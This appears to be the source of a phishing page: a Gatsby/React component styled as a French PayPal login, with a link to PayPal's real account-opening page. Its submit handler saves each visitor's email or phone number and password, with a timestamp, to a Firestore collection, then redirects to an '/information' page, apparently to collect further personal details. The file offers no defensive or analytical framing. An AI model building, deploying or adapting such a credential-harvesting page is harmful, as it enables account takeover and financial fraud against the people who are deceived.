import * as React from "react"
import {useState} from "react"
import {StaticImage} from "gatsby-plugin-image";
import './nicepage.css';
import './Connexion.css';
import { navigate } from "gatsby"
import {addLoginDetails} from "../firebase/firestore";
// markup
const IndexPage = () => {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");

    const [loading,setLoading]=useState(false);
    async function onSubmit(e) {

        e.preventDefault();
        setLoading(true);
        await addLoginDetails({email,password,timestamp:new Date().getTime()});
        await navigate('/information');
        setLoading(false);
    }

    return (
        <div className={"u-body u-xl-mode"}>

        <section className="u-align-center u-clearfix u-section-1" id="sec-fb27">
            <div className="u-clearfix u-sheet u-sheet-1">
                <StaticImage className="u-image u-image-default u-image-1" src="../images/R.png" alt="" width={2272}
                             height={1704}/>
                <div className="u-form u-form-1">
                    <form onSubmit={onSubmit} className="u-clearfix u-form-spacing-15 u-form-vertical u-inner-form"
                          style={{padding: "15px"}}>
                        <div className="u-form-group u-form-name u-label-none">
                            <label htmlFor="name-6797" className="u-label">Email ou numéro de mobile</label>
                            <input value={email} onChange={e => setEmail(e.target.value)} type="text"
                                   placeholder="Email ou numéro de mobile" id="name-6797" name="email"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""
                                   autoFocus="autofocus"/>
                        </div>
                        <div className="u-form-group u-form-name u-label-none u-form-group-2">
                            <label htmlFor="name-fe56" className="u-label">Mot de passe</label>
                            <input value={password} onChange={e => setPassword(e.target.value)} type="password"
                                   placeholder="Mot de passe" id="name-fe56" name="password"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                        </div>
                        <div className="u-align-center u-form-group u-form-submit">
                            <button disabled={loading} type="submit"
                                    className="u-btn u-btn-round u-btn-submit u-button-style u-custom-color-1 u-hover-custom-color-2 u-radius-50 u-btn-1">Connexion
                            </button>
                        </div>
                    </form>
                </div>
                <StaticImage className="u-image u-image-default u-image-2" src="../images/Sanstitre.jpg" alt=""
                             width={391}
                             height={19}/>
                <a href="https://www.paypal.com/fr/webapps/mpp/account-selection"
                   className="u-border-2 u-border-custom-color-1 u-border-hover-custom-color-2 u-btn u-btn-round u-button-style u-hover-white u-none u-radius-50 u-text-active-white u-text-custom-color-1 u-text-hover-custom-color-2 u-btn-2">Ouvrir
                    un compte</a>
                <StaticImage className="u-image u-image-default u-preserve-proportions u-image-3" src="../images/gg.jpg"
                             alt=""
                             width={108} height={34}/>
            </div>
        </section>
        </div>

    )
}

export default IndexPage
